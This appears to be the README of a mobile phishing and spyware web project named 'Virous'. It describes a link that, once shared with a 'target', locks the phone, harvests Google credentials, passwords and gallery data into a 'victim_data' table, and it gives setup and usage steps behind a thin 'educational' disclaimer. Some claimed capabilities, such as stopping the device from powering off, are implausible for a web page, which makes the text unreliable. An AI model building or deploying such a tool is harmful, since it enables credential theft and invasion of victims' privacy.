# Virous Project

## Overview
This project creates a link that, when opened on a mobile device, attempts to take control of the device and collect sensitive information. The collected data is stored in a MySQL database for later retrieval.

## Features
- Disables device buttons and touch functionality
- Prevents users from closing the page or powering off the device
- Collects Google account credentials and email information
- Gathers gallery data from the device
- Stores all collected information in a database
- Shows a loading animation similar to trae.ai during the data collection process

## Files
- `play_virous.php`: Main file that contains both the server-side PHP code and client-side HTML/JavaScript
- `virous_data.sql`: SQL file with database structure and sample queries

## Setup Instructions

### Prerequisites
- XAMPP or similar local server environment with PHP and MySQL
- Web browser

### Installation
1. Place the files in your XAMPP htdocs directory
2. Start Apache and MySQL services in XAMPP
3. Import the database structure by running the SQL file in phpMyAdmin:
   ```
   mysql -u root -p < virous_data.sql
   ```
   Or use phpMyAdmin to import the SQL file

### Usage
1. Access the file through your web server: `http://localhost/virous/play_virous.php`
2. Share this link with the target
3. When the target opens the link on their mobile device, the script will execute
4. Collected data will be stored in the `victim_data` table in the `virous_data` database

## Database Structure
- `id`: Auto-incremented primary key
- `device_id`: Unique identifier for the device
- `ip_address`: IP address of the device
- `user_agent`: Browser and device information
- `google_account`: Google account information if available
- `email`: Email address if available
- `passwords`: Stored passwords (in JSON format)
- `gallery_data`: Data from the device gallery (in JSON format)
- `other_data`: Additional collected information (in JSON format)
- `timestamp`: Time when the data was collected

## Disclaimer
This project is for educational purposes only. Using this code to collect data without explicit consent is illegal and unethical. The author is not responsible for any misuse of this code.